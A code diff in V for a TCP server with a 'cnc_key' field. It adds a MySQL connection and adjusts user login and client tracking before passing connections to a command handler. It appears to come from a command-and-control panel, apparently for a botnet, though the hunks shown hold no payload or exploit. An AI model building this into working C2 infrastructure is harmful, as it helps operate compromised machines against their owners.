@@ -4,6 +4,7 @@ import os
 import io
 import net
 import time
+import mysql
 import config
 import server
 
@@ -28,6 +29,7 @@ pub struct Server{
 		port 			string
 		cnc_key 		string
 		clients			&Clients
+		sqlconn			mysql.Connection
 }
 
 pub fn (mut s Server) set_port(port string) {
@@ -51,8 +53,7 @@ pub fn (mut s Server) connection_handler(mut socket net.TcpConn) {
 	mut password := reader.read_line() or { "" }
 	socket.write_string(config.Default) or { 0 } // reset color to default
 	print("New User has logged in! ${username}\r\n")
-	s.clients.new_user(username, mut socket, fixed_ip, fixed_port, false)
-	print(s)
+	s.clients.new_user(username, mut socket, fixed_ip, fixed_port.int(), false)
 	///////////////////////////////// Send to command handler after login! ///////////////////////////////////////////
 	server.cmd_handler(mut socket, mut &s, mut &start_current)
 }
@@ -79,7 +80,7 @@ pub fn (mut c Clients) new_user(uname string, mut socket net.TcpConn, ip string,
 	c.u_sockets << socket
 	c.u_ip << ip
 	c.u_port << port
-	c.using_client = using_client
+	c.using_client << using_client
 }
 
 pub fn (mut c Clients) remove_user(uname string) {
